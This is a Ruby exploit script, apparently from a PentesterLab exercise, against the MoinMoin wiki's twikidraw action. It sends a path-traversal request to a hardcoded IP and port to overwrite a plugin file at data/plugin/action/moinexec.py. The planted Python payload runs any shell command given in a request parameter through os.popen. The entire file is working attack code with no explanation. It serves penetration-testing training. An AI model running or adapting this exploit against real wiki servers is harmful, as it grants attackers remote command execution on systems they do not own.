require 'socket'

# function used to send request
# does not support chunk, gzip, zlib :p
def ssend(req) #{{
  socket=TCPSocket.new('38.64.138.253',1380)
  puts req  
  socket.write(req)
  resp = ""
  s=""
  while (s= socket.readline and !s.nil? )
    puts s
    resp+= s
    break if s =~ /^\r\n$/
  end
  if resp=~ /^Content-Length:\s+(\d+)\s*$/i
    resp+= socket.read($1.to_i)
  else 
    resp = socket.read
  end
  resp
end #}}

# getting  valid ticket
resp = ssend("GET /WikiSandBox?action=twikidraw&do=modify&target=../../../../data/plugin/action/moinexec.py HTTP/1.0\r\nHost: 38.64.138.253:1380\r\n\r\n")
# if resp =~ /ticket=(.*?)&target=/
#   ticket = $1
# end

# change the ticket here each time when you retry the exploit
head = "POST /WikiSandBox?action=twikidraw&do=save&ticket=0061e7ec06.09138ee29fd74659e95175ebe02b1860f0dd866c&target=../../../../data/plugin/action/moinexec.py HTTP/1.1\r\nHost: 38.64.138.253:1380\r\nContent-Type: multipart/form-data; boundary=pentesterlab\r\nContent-Length: "

payload = "drawing.s if()else()\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['c'])\\56read()\""

# Building the request's body:

body = "--pentesterlab\r\n"

# Payload:
body += "Content-Disposition: form-data; name=\"filename\"\r\nContent-Type: image/png\r\n\r\ndrawing.s if()else()\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['c'])\\56read()\"\r\n--pentesterlab\r\n"

# File content:
body += "Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"\r\nContent-Type: image/png\r\n\r\nBLAH\r\n--pentesterlab--\r\n"
 
#Final request
puts head+body.size.to_s+"\r\n\r\n"+body
puts ssend(head+body.size.to_s+"\r\n\r\n"+body)
